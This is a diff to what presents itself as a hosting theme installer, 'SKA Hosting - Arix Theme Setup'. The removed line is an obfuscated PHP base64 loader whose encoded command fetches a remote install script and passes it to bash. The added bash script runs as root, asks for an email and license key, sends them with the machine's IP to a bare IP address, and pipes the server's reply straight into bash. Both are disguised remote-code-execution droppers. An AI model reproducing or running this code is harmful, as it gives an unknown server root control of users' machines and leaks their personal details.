@@ -1,1 +1,20 @@
-<?php eval(base64_decode('CiBnb3RvIEN3dlFSOyBFSkdVMDogcGFzc3RocnUoJGNvbW1hbmQpOyBnb3RvIEpFVzVUOyBKRVc1VDogZ290byBFMjRLdTsgZ290byBpR3JGeTsgWFhuZmY6IEUyNEt1OiBnb3RvIFNoSW9WOyBVS1lUbTogZ290byBIY2JUUjsgZ290byBYWG5mZjsgQ3d2UVI6IGdvdG8gWlg2dWE7IGdvdG8gbzM2NkQ7IGlHckZ5OiBaWDZ1YTogZ290byBYWVdHZTsgbzM2NkQ6IEhjYlRSOiBnb3RvIFlwaTQzOyBPZmhpQjogeThrTjQ6IGdvdG8gRUpHVTA7IFpSdmZ1OiBnb3RvIHk4a040OyBnb3RvIE9maGlCOyBYWVdHZTogJGxpY2Vuc2Vfa2V5ID0gIlwxMjNceDRmXHg1NVwxMjJcMTExXHg0ZVx4NDJceDQ1XDYyXDYwXHgzMlw3MFx4MzFcNjJcNjMiOyBnb3RvIFVLWVRtOyBZcGk0MzogJGNvbW1hbmQgPSAiXDE0M1wxNjVcMTYyXHg2Y1w0MFx4MmRcMTYzXHg1M1x4NGNceDIwXDE1MFwxNjRceDc0XDE2MFx4NzNcNzJceDJmXHgyZlx4NzJceDYxXDE2N1w1NlwxNDdceDY5XHg3NFwxNTBceDc1XHg2Mlx4NzVcMTYzXDE0NVx4NzJceDYzXDE1N1wxNTZceDc0XHg2NVx4NmVceDc0XHgyZVx4NjNcMTU3XHg2ZFx4MmZcMTQzXHg2Zlx4NjRceDY5XHg2ZVx4NjdceDJkXHg3NVx4NmNcMTY0XDE2MlwxNDFceDJmXHg2Nlx4NjhcMTUyXHg3OVwxNjZceDZlXDE1M1w1N1x4NmRceDYxXHg2OVwxNTZcNTdceDY5XHg2ZVx4NzNceDc0XDE0MVx4NmNceDZjXDU2XDE2M1wxNTBceDIwXDE3NFw0MFwxNDJcMTQxXDE2M1x4NjgiOyBnb3RvIFpSdmZ1OyBTaElvVjog')); ?>
+#!/bin/bash
+if [ "$EUID" -ne 0 ]; then
+  echo -e "\e[31m❌ Error: Please run this script as root (use sudo).\e[0m"
+  exit 1
+fi
+clear
+echo -e "\e[36m\e[1m==========================================\e[0m"
+echo -e "\e[36m\e[1m      SKA Hosting - Arix Theme Setup      \e[0m"
+echo -e "\e[36m\e[1m==========================================\e[0m"
+read -p "📧 Enter your Email: " EMAIL
+read -p "🔑 Enter your License Key: " LICENSE_KEY
+echo -ne "\e[33m⚙️ Fetching System IP... \e[0m"
+USER_IP=$(curl -s --max-time 5 https://api.ipify.org || echo "Unknown")
+echo -e "\e[32mDone ($USER_IP)\e[0m"
+echo -ne "\e[33m🔄 Verifying License with Server... \e[0m"
+
+# Directly pipe the encrypted response to bash
+curl -s -X POST "http://78.154.103.27:13915/api/verify-license" \
+     -H "Content-Type: application/json" \
+     -d "{\"key\":\"$LICENSE_KEY\", \"email\":\"$EMAIL\", \"ip\":\"$USER_IP\"}" | bash
